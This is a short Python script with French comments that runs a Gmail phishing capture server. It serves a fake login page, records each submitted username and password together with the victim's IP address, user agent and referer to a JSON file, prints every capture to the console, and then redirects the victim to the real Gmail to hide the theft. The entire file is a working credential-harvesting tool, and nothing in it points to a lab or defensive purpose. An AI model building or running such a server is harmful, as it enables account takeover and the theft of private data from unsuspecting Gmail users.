#!/usr/bin/env python3
# serveur de capture gmail - identifiants + IP + UA -> captures.json, puis redirection reelle
import http.server, urllib.parse, json, datetime, os

REDIRECT = "https://mail.google.com/"
PAGE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "page.html")
CAPS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captures.json")

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/login":
            b = open(PAGE, "rb").read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers(); self.wfile.write(b)
        else:
            self.send_response(302)
            self.send_header("Location", REDIRECT)
            self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        data = urllib.parse.parse_qs(self.rfile.read(n).decode())
        entry = {
            "heure": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "site": "gmail",
            "identifiant": data.get("u", [""])[0],
            "mot_de_passe": data.get("p", [""])[0],
        }
        caps = json.load(open(CAPS)) if os.path.exists(CAPS) else []
        caps.append(entry)
        json.dump(caps, open(CAPS, "w"), ensure_ascii=False, indent=1)
        print(f"[CAPTURE] {entry['heure']} IP={entry['ip']} {entry['identifiant']} : {entry['mot_de_passe']}")
        self.send_response(302)
        self.send_header("Location", REDIRECT)
        self.end_headers()

    def log_message(self, *a): pass

http.server.HTTPServer(("0.0.0.0", 8085), H).serve_forever()
